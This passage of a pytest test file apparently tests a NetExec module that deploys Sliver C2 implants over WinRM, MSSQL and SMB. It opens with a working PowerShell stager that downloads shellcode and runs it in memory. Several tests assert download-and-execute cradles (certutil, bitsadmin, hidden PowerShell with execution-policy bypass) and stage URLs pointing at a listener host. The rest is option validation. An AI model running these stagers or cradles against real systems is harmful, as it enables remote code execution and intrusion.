[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};

# Download shellcode from stager listener
$wc = New-Object System.Net.WebClient;
$wc.Headers.Add('User-Agent', 'Mozilla/5.0');
$bytes = $wc.DownloadData('{stage_url}');
$wc.Dispose();

# Allocate memory and execute
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mem {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint c, IntPtr id);
}}
"@;

$addr = [Mem]::VirtualAlloc(0, $bytes.Length, (0x1000 -bor 0x2000), 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length);
[Mem]::CreateThread(0, 0, $addr, 0, 0, 0);
"""

        # Simulate the encoding chain that stage_execute() performs:
        # 1. UTF-8 to string (already done)
        # 2. UTF-16LE encode
        # 3. Base64 encode
        encoded = base64.b64encode(bootstrap_script.encode("utf-16-le")).decode("ascii")

        # WMI command wrapper adds minimal overhead
        total_size = len(encoded)

        # Assert: Must be well under 150KB WinRM limit (153,600 bytes)
        assert total_size < 150 * 1024, (
            f"Bootstrap payload {total_size} bytes exceeds 150KB WinRM limit ({150 * 1024} bytes)"
        )

        # Verify it's actually small (should be around 2-5KB)
        assert total_size < 10 * 1024, f"Bootstrap payload {total_size} bytes is larger than expected (~2-5KB range)"

        print(f"✓ Bootstrap stager payload: {total_size} bytes (< 150KB limit, target ~2-5KB)")

    def test_options_cleanup_mode_always(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test CLEANUP_MODE=always parsing."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["CLEANUP_MODE"] = "always"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.cleanup_mode == "always"

    def test_options_cleanup_mode_success(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test CLEANUP_MODE=success parsing."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["CLEANUP_MODE"] = "success"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.cleanup_mode == "success"

    def test_options_cleanup_mode_never(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test CLEANUP_MODE=never parsing."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["CLEANUP_MODE"] = "never"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.cleanup_mode == "never"

    def test_options_cleanup_mode_invalid(self, mock_context, mock_module_options):
        """Test invalid CLEANUP_MODE validation."""
        mock_module_options["CLEANUP_MODE"] = "invalid"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 6
        assert (
            mock_context.log.fail.call_args_list[0][0][0]
            == "CLEANUP_MODE must be one of: always, success, never (default: always)"
        )
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Examples:"
        assert mock_context.log.fail.call_args_list[3][0][0] == "  -o CLEANUP_MODE=always    # Always cleanup (default)"
        assert (
            mock_context.log.fail.call_args_list[4][0][0]
            == "  -o CLEANUP_MODE=success   # Only cleanup if beacon registered"
        )
        assert mock_context.log.fail.call_args_list[5][0][0] == "  -o CLEANUP_MODE=never     # Never cleanup"

    def test_cleanup_only_on_success(self, patch_get_worker, module_instance, mock_context, mock_connection):
        """Test CLEANUP_MODE=success only cleans up if beacon registers."""
        mock_worker = patch_get_worker

        mock_worker.submit_task.side_effect = lambda method, *a, **k: (
            [] if method in ["beacons", "sessions"] else None
        )

        mock_handler = Mock()
        mock_handler.get_cleanup_cmd = Mock(return_value="del /f /q C:\\temp\\implant.exe")

        module_instance.config_path = "/fake/config.cfg"
        module_instance.wait_seconds = 1

        conn = mock_connection
        conn.__class__.__name__ = "winrm"
        conn.ps_execute = Mock(return_value="")

        module_instance._wait_for_beacon_and_cleanup(
            mock_context,
            conn,
            "C:\\temp\\implant.exe",
            "windows",
            "implant_test",
            mock_handler,
            "winrm",
            cleanup_mode="success",
            listener_job_id=None,
            website_name=None,
        )

        mock_handler.get_cleanup_cmd.assert_not_called()

    def test_options_beacon_interval_valid(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test valid BEACON_INTERVAL values."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["BEACON_INTERVAL"] = "10"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_interval == 10

    def test_options_beacon_interval_at_min(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test BEACON_INTERVAL at minimum boundary (1 second)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["BEACON_INTERVAL"] = "1"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_interval == 1

    def test_options_beacon_interval_at_max(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test BEACON_INTERVAL at maximum boundary (3600 seconds)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["BEACON_INTERVAL"] = "3600"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_interval == 3600

    def test_options_beacon_interval_too_low(self, mock_context, mock_module_options):
        """Test BEACON_INTERVAL below minimum (1 second)."""
        mock_module_options["BEACON_INTERVAL"] = "0"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "BEACON_INTERVAL must be between 1-3600 seconds: 0"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o BEACON_INTERVAL=10"

    def test_options_beacon_interval_too_high(self, mock_context, mock_module_options):
        """Test BEACON_INTERVAL above maximum (3600 seconds)."""
        mock_module_options["BEACON_INTERVAL"] = "3601"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "BEACON_INTERVAL must be between 1-3600 seconds: 3601"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o BEACON_INTERVAL=10"

    def test_options_beacon_interval_non_numeric(self, mock_context, mock_module_options):
        """Test non-numeric BEACON_INTERVAL."""
        mock_module_options["BEACON_INTERVAL"] = "not-a-number"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert (
            mock_context.log.fail.call_args_list[0][0][0]
            == "BEACON_INTERVAL must be between 1-3600 seconds: not-a-number"
        )
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o BEACON_INTERVAL=10"

    def test_options_beacon_jitter_valid(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test valid BEACON_JITTER values."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["BEACON_JITTER"] = "5"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_jitter == 5

    def test_options_beacon_jitter_zero(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test BEACON_JITTER can be zero."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["BEACON_JITTER"] = "0"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_jitter == 0

    def test_options_beacon_jitter_at_max(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test BEACON_JITTER at maximum boundary (3600 seconds)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["BEACON_JITTER"] = "3600"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_jitter == 3600

    def test_options_beacon_jitter_too_high(self, mock_context, mock_module_options):
        """Test BEACON_JITTER above maximum (3600 seconds)."""
        mock_module_options["BEACON_JITTER"] = "3601"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "BEACON_JITTER must be between 0-3600 seconds: 3601"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o BEACON_JITTER=3"

    def test_options_beacon_jitter_negative(self, mock_context, mock_module_options):
        """Test BEACON_JITTER cannot be negative."""
        mock_module_options["BEACON_JITTER"] = "-1"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "BEACON_JITTER must be between 0-3600 seconds: -1"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o BEACON_JITTER=3"

    def test_options_beacon_jitter_non_numeric(self, mock_context, mock_module_options):
        """Test non-numeric BEACON_JITTER."""
        mock_module_options["BEACON_JITTER"] = "not-a-number"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert (
            mock_context.log.fail.call_args_list[0][0][0]
            == "BEACON_JITTER must be between 0-3600 seconds: not-a-number"
        )
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o BEACON_JITTER=3"

    def test_options_wait_valid(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test valid WAIT values."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["WAIT"] = "120"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.wait_seconds == 120

    def test_options_wait_at_max(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test WAIT at maximum boundary (3600 seconds)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["WAIT"] = "3600"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.wait_seconds == 3600

    def test_options_wait_too_low(self, mock_context, mock_module_options):
        """Test WAIT below minimum (1 second)."""
        mock_module_options["WAIT"] = "0"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "WAIT must be between 1-3600 seconds: 0"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o WAIT=120"

    def test_options_wait_too_high(self, mock_context, mock_module_options):
        """Test WAIT above maximum (3600 seconds)."""
        mock_module_options["WAIT"] = "3601"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "WAIT must be between 1-3600 seconds: 3601"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o WAIT=120"

    def test_options_wait_non_numeric(self, mock_context, mock_module_options):
        """Test non-numeric WAIT."""
        mock_module_options["WAIT"] = "not-a-number"
        module = NXCModule()
        with pytest.raises(ModuleValidationError):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "WAIT must be between 1-3600 seconds: not-a-number"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o WAIT=120"

    def test_staging_direct_option_parsing(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test STAGING=none option sets correct flags."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "none"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.staging_mode is None

    def test_mssql_with_staging_none_uses_upload(self, mock_context, mock_connection, module_instance):
        """Test MSSQL with STAGING=none uses direct upload."""
        module_instance.staging_mode = None
        module_instance.protocol = "mssql"
        module_instance.os_type = "windows"

        assert module_instance.staging_mode is None
        assert module_instance.protocol == "mssql"

    @pytest.mark.mutmut_skip
    def test_wmic_pattern_in_certutil_staging(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test that certutil staging uses WMIC process call create for async execution."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "certutil"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Verify staging method is set correctly
        assert module_instance.download_tool == "certutil"

        # Read the actual code to verify WMIC pattern is present
        import inspect

        source = inspect.getsource(module_instance._build_download_cradle)

        # Verify WMIC pattern: the method calls _build_wmic_command for certutil
        assert "self._build_wmic_command" in source, (
            "certutil staging should use _build_wmic_command for async execution"
        )
        assert "certutil -urlcache" in source, "Should use certutil -urlcache command"

    @pytest.mark.mutmut_skip
    def test_wmic_pattern_in_bitsadmin_staging(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test that bitsadmin staging uses WMIC process call create for async execution."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "bitsadmin"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Verify staging method is set correctly
        assert module_instance.download_tool == "bitsadmin"

        # Read the actual code to verify WMIC pattern is present
        import inspect

        source = inspect.getsource(module_instance._build_download_cradle)

        # Verify WMIC pattern: the method calls _build_wmic_command for bitsadmin
        assert "self._build_wmic_command" in source, (
            "bitsadmin staging should use _build_wmic_command for async execution"
        )
        assert "bitsadmin /transfer" in source, "Should use bitsadmin /transfer command"

    @pytest.mark.mutmut_skip
    def test_powershell_staging_unchanged(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test that PowerShell staging still uses Start-Process (not WMIC)."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "powershell"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Verify staging method is set correctly
        assert module_instance.download_tool == "powershell"

        # Read the actual code
        import inspect

        source = inspect.getsource(module_instance._execute_staged_command)

        # Verify PowerShell still uses Start-Process (not WMIC)
        assert "Start-Process" in source, "PowerShell staging should still use Start-Process"

    @pytest.mark.mutmut_skip
    def test_smb_staging_powershell_uses_start_process(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test that PowerShell SMB staging uses Start-Process for async execution."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "powershell"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Verify staging method is set correctly
        assert module_instance.download_tool == "powershell"

        # Read the actual code to verify SMB PowerShell pattern
        import inspect

        source = inspect.getsource(module_instance._build_download_cradle)

        # Verify SMB context and PowerShell async pattern
        assert "cmd /c powershell" in source, "PowerShell SMB staging should use cmd /c wrapper"
        assert "Start-Process" in source, "PowerShell SMB staging should use Start-Process"
        assert "powershell -ep bypass -w hidden" in source, "PowerShell SMB should use bypass mode"

    @pytest.mark.mutmut_skip
    def test_smb_staging_certutil_uses_wmic(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test that certutil SMB staging uses WMIC process call create for async execution."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "certutil"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Verify staging method is set correctly
        assert module_instance.download_tool == "certutil"

        # Read the actual code to verify WMIC pattern
        import inspect

        source = inspect.getsource(module_instance._build_download_cradle)

        # Verify WMIC pattern: the method calls _build_wmic_command for certutil
        assert "self._build_wmic_command" in source, (
            "certutil SMB staging should use _build_wmic_command for async execution"
        )
        assert "certutil -urlcache" in source, "SMB certutil should use certutil -urlcache command"

    @pytest.mark.mutmut_skip
    def test_smb_staging_bitsadmin_uses_wmic(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test that bitsadmin SMB staging uses WMIC process call create for async execution."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "bitsadmin"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Verify staging method is set correctly
        assert module_instance.download_tool == "bitsadmin"

        # Read the actual code to verify WMIC pattern
        import inspect

        source = inspect.getsource(module_instance._build_download_cradle)

        # Verify WMIC pattern: the method calls _build_wmic_command for bitsadmin
        assert "self._build_wmic_command" in source, (
            "bitsadmin SMB staging should use _build_wmic_command for async execution"
        )
        assert "bitsadmin /transfer" in source, "SMB bitsadmin should use bitsadmin /transfer command"

    @pytest.mark.mutmut_skip
    def test_smb_staging_windows_only_check(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test that SMB staging validates Windows-only support."""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "download"
        mock_module_options["HTTP_STAGING_PORT"] = "8080"
        mock_module_options["DOWNLOAD_TOOL"] = "powershell"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Verify staging method is set correctly
        assert module_instance.download_tool == "powershell"

        # Read the actual code to verify Windows-only validation
        import inspect

        source = inspect.getsource(module_instance._execute_staged_command)

        # Verify SMB staging includes Windows-only checks
        assert 'elif protocol == "smb"' in source, "SMB staging block should exist"
        assert 'os_type != "windows"' in source, "SMB staging should check for Windows-only support"

    @pytest.mark.mutmut_skip
    def test_smb_auto_enable_staging(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test that SMB auto-enables staging for Windows targets."""
        mock_context.conf.get.return_value = mock_config_file
        # Set STAGING to none to test auto-enable
        mock_module_options["STAGING"] = "none"
        mock_module_options["RHOST"] = "10.0.0.1"
        module_instance.options(mock_context, mock_module_options)

        # Read the actual code to verify auto-enable logic
        import inspect

        source = inspect.getsource(module_instance._run_beacon)

        # Verify SMB auto-enable block exists and checks Windows
        assert 'protocol == "smb"' in source, "SMB auto-enable check should exist"
        assert 'os_type == "windows"' in source, "SMB auto-enable should check for Windows OS"
        assert 'self.staging_mode = "download"' in source, "SMB auto-enable should set staging_mode to download"

    def test_generate_sliver_stager_success(self, patch_get_worker, module_instance, mock_context):
        """Test successful stager generation with mocked worker."""
        # Mock shellcode generation response
        mock_stage2_resp = Mock()
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2_shellcode_bytes"

        # Mock profile save response
        mock_saved_stage2 = Mock()
        mock_saved_stage2.Name = "nxc_stage2_abcd1234"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_stage2
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = None
        module_instance.shellcode_listener_port = None

        bootstrap_bytes = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test_implant", None
        )
        assert bootstrap_bytes is not None
        assert isinstance(bootstrap_bytes, bytes)
        assert len(bootstrap_bytes) > 0
        mock_context.log.info.assert_any_call("Generating tiny HTTP bootstrap stager...")
        # Check for the new log message format with byte count
        assert any("Bootstrap stager generated" in str(call) for call in mock_context.log.info.call_args_list)

    def test_generate_sliver_stager_shellcode_failure(self, patch_get_worker, module_instance, mock_context):
        """Test stager generation handles empty shellcode response."""
        # Mock empty shellcode response
        mock_stage2_resp = Mock()
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b""

        patch_get_worker.submit_task.return_value = mock_stage2_resp

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"

        with pytest.raises(ValueError, match="Stage 2 shellcode gen failed"):
            module_instance._generate_sliver_stager(mock_context, "windows", "amd64", "test_implant", None)

    def test_generate_sliver_stager_profile_save_failure(self, patch_get_worker, module_instance, mock_context):
        """Test stager generation handles profile save error."""
        # Mock shellcode generation response
        mock_stage2_resp = Mock()
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2_shellcode_bytes"

        # Mock profile save failure
        mock_saved_stage2 = Mock()
        mock_saved_stage2.Name = None

        calls = {}

        def side_effect(method, *args, **kwargs):
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_stage2
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"

        with pytest.raises(TypeError):
            module_instance._generate_sliver_stager(mock_context, "windows", "amd64", "test_implant", None)

    def test_generate_sliver_stager_http_url(self, patch_get_worker, module_instance, mock_context):
        """Test HTTP stage URL construction."""
        # Mock responses
        mock_stage2_resp = Mock()
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2_shellcode_bytes"
        mock_saved_stage2 = Mock()
        mock_saved_stage2.Name = "nxc_stage2_abcd1234"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_stage2
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "http"
        module_instance.shellcode_listener_host = "10.0.0.1"
        module_instance.shellcode_listener_port = "8080"

        bootstrap_bytes = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test_implant", None
        )
        bootstrap_ps = bootstrap_bytes.decode("utf-8")
        assert "http://10.0.0.1:8080/nxc_stage2_" in bootstrap_ps

    def test_generate_sliver_stager_https_url(self, patch_get_worker, module_instance, mock_context):
        """Test HTTPS stage URL construction."""
        # Mock responses
        mock_stage2_resp = Mock()
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2_shellcode_bytes"
        mock_saved_stage2 = Mock()
        mock_saved_stage2.Name = "nxc_stage2_abcd1234"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_stage2
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "https"
        module_instance.shellcode_listener_host = "10.0.0.1"
        module_instance.shellcode_listener_port = "8443"

        bootstrap_bytes = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test_implant", None
        )
        bootstrap_ps = bootstrap_bytes.decode("utf-8")
        assert "https://10.0.0.1:8443/nxc_stage2_" in bootstrap_ps

    def test_generate_sliver_stager_tcp_url(self, patch_get_worker, module_instance, mock_context):
        """Test TCP stage URL construction."""
        # Mock responses
        mock_stage2_resp = Mock()
        mock_stage2_resp.File = Mock()
        mock_stage2_resp.File.Data = b"stage2_shellcode_bytes"
        mock_saved_stage2 = Mock()
        mock_saved_stage2.Name = "nxc_stage2_abcd1234"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "generate_shellcode":
                return mock_stage2_resp
            elif method == "save_implant_profile":
                return mock_saved_stage2
            elif method == "stage_implant_build":
                return None
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.shellcode_protocol = "tcp"
        module_instance.shellcode_listener_host = "10.0.0.1"
        module_instance.shellcode_listener_port = "4444"

        bootstrap_bytes = module_instance._generate_sliver_stager(
            mock_context, "windows", "amd64", "test_implant", None
        )
        bootstrap_ps = bootstrap_bytes.decode("utf-8")
        assert "tcp://10.0.0.1:4444/nxc_stage2_" in bootstrap_ps


class TestWinRMHandler:
    """Test WinRMHandler protocol handler methods."""

    def test_get_remote_paths_windows(self, mock_context):
        """Test get_remote_paths returns Windows path and None for WinRM."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)

        full_path, share = handler.get_remote_paths("windows", "implant.exe")

        assert full_path == "C:\\Windows\\Temp\\implant.exe"
        assert share is None

    def test_get_remote_paths_raises_non_windows(self, mock_context):
        """Test get_remote_paths raises ValueError for non-Windows targets."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)

        with pytest.raises(ValueError, match="WinRM handler assumes Windows target"):
            handler.get_remote_paths("linux", "implant")

    def test_upload_staging_skip(self, mock_context, mock_connection):
        """Test upload skips when both paths are None (staging mode)."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)

        handler.upload(mock_context, mock_connection, None, None)

        mock_connection.ps_execute.assert_not_called()

    def test_upload_normal(self, mock_context, mock_connection, tmp_path):
        """Test upload uses chunked_upload with ps_execute."""
        from nxc.modules.sliver_exec import WinRMHandler
        import tempfile

        module = Mock()
        handler = WinRMHandler(module)

        mock_connection.ps_execute = Mock(return_value="")

        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".exe")
        temp_file.write(b"implantdata")
        temp_file.close()

        try:
            handler.upload(mock_context, mock_connection, temp_file.name, "C:\\Windows\\Temp\\implant.exe")

            mock_connection.ps_execute.assert_called()
            mock_context.log.success.assert_called_with("WinRM upload complete (via chunked base64)")
        finally:
            import os

            os.unlink(temp_file.name)

    def test_execute_normal(self, mock_context, mock_connection):
        """Test execute uses WMI Win32_Process.Create for normal execution."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)

        mock_connection.ps_execute = Mock(return_value="")

        handler.execute(mock_context, mock_connection, "C:\\Windows\\Temp\\implant.exe", "windows")

        mock_connection.ps_execute.assert_called_once()
        args = mock_connection.ps_execute.call_args
        assert "Win32_Process" in args[0][0]
        assert "C:\\Windows\\Temp\\implant.exe" in args[0][0]
        assert args[1]["get_output"] is True
        mock_context.log.info.assert_called_with("Executed via WinRM: C:\\Windows\\Temp\\implant.exe")

    def test_execute_staging_mode(self, mock_context, mock_connection):
        """Test execute delegates to stage_execute when stager_data is provided."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)
        handler.stage_execute = Mock(return_value=True)

        stager_data = b"test_stager"

        handler.execute(
            mock_context, mock_connection, "C:\\Windows\\Temp\\implant.exe", "windows", stager_data=stager_data
        )

        handler.stage_execute.assert_called_once_with(mock_context, mock_connection, "windows", stager_data)

    def test_stage_execute_success(self, mock_context, mock_connection):
        """Test stage_execute encodes bootstrap and executes via WMI."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)

        mock_connection.ps_execute = Mock(return_value="")
        stager_data = b'$BootstrapScript = "test"'

        result = handler.stage_execute(mock_context, mock_connection, "windows", stager_data)

        assert result is True
        mock_connection.ps_execute.assert_called_once()
        args = mock_connection.ps_execute.call_args
        assert "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand" in args[0][0]
        mock_context.log.info.assert_any_call("Bootstrap stager injected (fileless download from stager listener)")

    def test_stage_execute_size_check_fail(self, mock_context, mock_connection):
        """Test stage_execute fails if bootstrap exceeds WinRM 150KB limit."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)

        mock_connection.ps_execute = Mock(return_value="")
        stager_data = b"A" * 200000

        result = handler.stage_execute(mock_context, mock_connection, "windows", stager_data)

        assert result is False
        mock_connection.ps_execute.assert_not_called()
        mock_context.log.fail.assert_called()

    def test_get_cleanup_cmd(self, mock_context):
        """Test get_cleanup_cmd returns PowerShell Remove-Item command."""
        from nxc.modules.sliver_exec import WinRMHandler

        module = Mock()
        handler = WinRMHandler(module)

        cmd = handler.get_cleanup_cmd("C:\\Windows\\Temp\\implant.exe", "windows")

        assert cmd == "Remove-Item -Force 'C:\\Windows\\Temp\\implant.exe'"


class TestMSSQLHandler:
    """Test MSSQLHandler protocol handler methods."""

    def test_get_remote_paths_windows(self, mock_context):
        """Test get_remote_paths returns Windows path and None for MSSQL."""
        from nxc.modules.sliver_exec import MSSQLHandler

        module = Mock()
        handler = MSSQLHandler(module)

        full_path, share = handler.get_remote_paths("windows", "implant.exe")

        assert full_path == "C:\\Users\\Public\\implant.exe"
        assert share is None

    def test_get_remote_paths_raises_non_windows(self, mock_context):
        """Test get_remote_paths raises ValueError for non-Windows targets."""
        from nxc.modules.sliver_exec import MSSQLHandler

        module = Mock()
        handler = MSSQLHandler(module)

